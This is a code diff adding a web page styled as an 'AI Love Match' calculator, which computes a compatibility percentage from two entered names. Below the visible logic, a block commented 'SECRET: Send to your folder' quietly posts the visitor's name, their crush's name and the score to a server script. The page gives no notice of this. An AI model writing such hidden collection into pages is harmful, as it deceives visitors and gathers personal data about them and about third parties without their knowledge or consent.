@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>AI Love Match 2026</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background: #fff5f8; display: flex; justify-content: center; padding-top: 50px; }
+        .card { background: white; padding: 25px; border-radius: 15px; box-shadow: 0 10px 20px rgba(0,0,0,0.1); width: 320px; text-align: center; }
+        h2 { color: #ff4d6d; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 2px solid #ffccd5; border-radius: 10px; outline: none; }
+        button { width: 95%; padding: 12px; background: #ff4d6d; color: white; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; }
+        #res { font-size: 3.5rem; color: #ff4d6d; margin-top: 20px; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>Love Calculator ❤️</h2>
+        <input type="text" id="p1" placeholder="Your Name">
+        <input type="text" id="p2" placeholder="Crush's Name">
+        <button onclick="process()">Check Compatibility</button>
+        <div id="res"></div>
+    </div>
+
+    <script>
+        function process() {
+            const n1 = document.getElementById('p1').value;
+            const n2 = document.getElementById('p2').value;
+            if(!n1 || !n2) return;
+
+            // 1. Math Logic (BGBG)
+            let b = n1.toLowerCase().replace(/\s/g, '').split('');
+            let g = n2.toLowerCase().replace(/\s/g, '').split('');
+            let nums = [];
+            while (b.length > 0 || g.length > 0) {
+                if (b.length > 0) { let c = b.shift(); let i = g.indexOf(c); if (i !== -1) { g.splice(i, 1); nums.push(2); } else { nums.push(1); } }
+                if (g.length > 0) { let c = g.shift(); let i = b.indexOf(c); if (i !== -1) { b.splice(i, 1); nums.push(2); } else { nums.push(1); } }
+            }
+            let cur = [...nums];
+            while (cur.length > 2) {
+                let nxt = [];
+                for (let l=0, r=cur.length-1; l<=r; l++, r--) {
+                    if (l === r) nxt.push(cur[l]);
+                    else nxt.push(cur[l] + cur[r]);
+                }
+                if (nxt.length === 2 && nxt[0] >= 10) { nxt = [Math.floor(nxt[0]/10) + nxt[1], nxt[0]%10]; }
+                cur = nxt;
+            }
+            const finalScore = cur.join('') + "%";
+            document.getElementById('res').innerText = finalScore;
+
+            // 2. SECRET: Send to your folder
+            fetch('save.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+                body: 'n1=' + encodeURIComponent(n1) + '&n2=' + encodeURIComponent(n2) + '&score=' + encodeURIComponent(finalScore)
+            });
+        }
+    </script>
+</body>
+</html>
